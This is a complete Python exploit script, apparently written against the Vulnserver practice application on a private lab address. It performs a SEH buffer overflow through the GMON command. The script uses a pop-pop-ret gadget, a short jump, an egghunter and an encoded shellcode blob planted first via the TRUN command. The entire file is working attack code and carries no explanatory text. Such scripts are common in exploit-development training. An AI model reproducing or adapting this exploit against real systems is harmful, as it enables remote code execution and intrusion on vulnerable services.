#!/usr/bin/env python3

from pwn import *


size = 5000
lpad = b'\x41' * 3515

jmp = b'\x90\x90\xeb\x06' # nop; nop; jmp 0x8
ppr = p32(0x625011b3)     # pop eax; pop eax; ret
nop = b'\x90' * 8

egghunter = b'f\x81\xca\xff\x0fBRj\x02X\xcd.<\x05Zt\xef\xb8w00t\x89\xd7\xafu\xea\xafu\xe7\xff\xe7'

rpad =    b'\x42' * (size - len(lpad) - 4 - 4 - len(nop) - len(egghunter))
payload = lpad + jmp + ppr + nop + egghunter + rpad

shellcode =  b"w00tw00t"
shellcode += b"\xda\xd6\xd9\x74\x24\xf4\xba\x2c\xdb\xf7\xe7"
shellcode += b"\x58\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13"
shellcode += b"\x03\x7c\xc8\x15\x12\x80\x06\x5b\xdd\x78\xd7"
shellcode += b"\x3c\x57\x9d\xe6\x7c\x03\xd6\x59\x4d\x47\xba"
shellcode += b"\x55\x26\x05\x2e\xed\x4a\x82\x41\x46\xe0\xf4"
shellcode += b"\x6c\x57\x59\xc4\xef\xdb\xa0\x19\xcf\xe2\x6a"
shellcode += b"\x6c\x0e\x22\x96\x9d\x42\xfb\xdc\x30\x72\x88"
shellcode += b"\xa9\x88\xf9\xc2\x3c\x89\x1e\x92\x3f\xb8\xb1"
shellcode += b"\xa8\x19\x1a\x30\x7c\x12\x13\x2a\x61\x1f\xed"
shellcode += b"\xc1\x51\xeb\xec\x03\xa8\x14\x42\x6a\x04\xe7"
shellcode += b"\x9a\xab\xa3\x18\xe9\xc5\xd7\xa5\xea\x12\xa5"
shellcode += b"\x71\x7e\x80\x0d\xf1\xd8\x6c\xaf\xd6\xbf\xe7"
shellcode += b"\xa3\x93\xb4\xaf\xa7\x22\x18\xc4\xdc\xaf\x9f"
shellcode += b"\x0a\x55\xeb\xbb\x8e\x3d\xaf\xa2\x97\x9b\x1e"
shellcode += b"\xda\xc7\x43\xfe\x7e\x8c\x6e\xeb\xf2\xcf\xe6"
shellcode += b"\xd8\x3e\xef\xf6\x76\x48\x9c\xc4\xd9\xe2\x0a"
shellcode += b"\x65\x91\x2c\xcd\x8a\x88\x89\x41\x75\x33\xea"
shellcode += b"\x48\xb2\x67\xba\xe2\x13\x08\x51\xf2\x9c\xdd"
shellcode += b"\xf6\xa2\x32\x8e\xb6\x12\xf3\x7e\x5f\x78\xfc"
shellcode += b"\xa1\x7f\x83\xd6\xc9\xea\x7e\xb1\x35\x42\xfa"
shellcode += b"\xa6\xde\x91\xfa\x39\x43\x1f\x1c\x53\x6b\x49"
shellcode += b"\xb7\xcc\x12\xd0\x43\x6c\xda\xce\x2e\xae\x50"
shellcode += b"\xfd\xcf\x61\x91\x88\xc3\x16\x51\xc7\xb9\xb1"
shellcode += b"\x6e\xfd\xd5\x5e\xfc\x9a\x25\x28\x1d\x35\x72"
shellcode += b"\x7d\xd3\x4c\x16\x93\x4a\xe7\x04\x6e\x0a\xc0"
shellcode += b"\x8c\xb5\xef\xcf\x0d\x3b\x4b\xf4\x1d\x85\x54"
shellcode += b"\xb0\x49\x59\x03\x6e\x27\x1f\xfd\xc0\x91\xc9"
shellcode += b"\x52\x8b\x75\x8f\x98\x0c\x03\x90\xf4\xfa\xeb"
shellcode += b"\x21\xa1\xba\x14\x8d\x25\x4b\x6d\xf3\xd5\xb4"
shellcode += b"\xa4\xb7\xe6\xfe\xe4\x9e\x6e\xa7\x7d\xa3\xf2"
shellcode += b"\x58\xa8\xe0\x0a\xdb\x58\x99\xe8\xc3\x29\x9c"
shellcode += b"\xb5\x43\xc2\xec\xa6\x21\xe4\x43\xc6\x63"


if __name__ == '__main__':
    with remote('192.168.122.44', 9999) as r:
        log.info('Storing shellcode')
        r.writeline(b'TRUN %s' % shellcode)

    with remote('192.168.122.44', 9999) as r:
        log.info('Sending exploit')
        r.writeline(b'GMON /.:/%s' % payload)

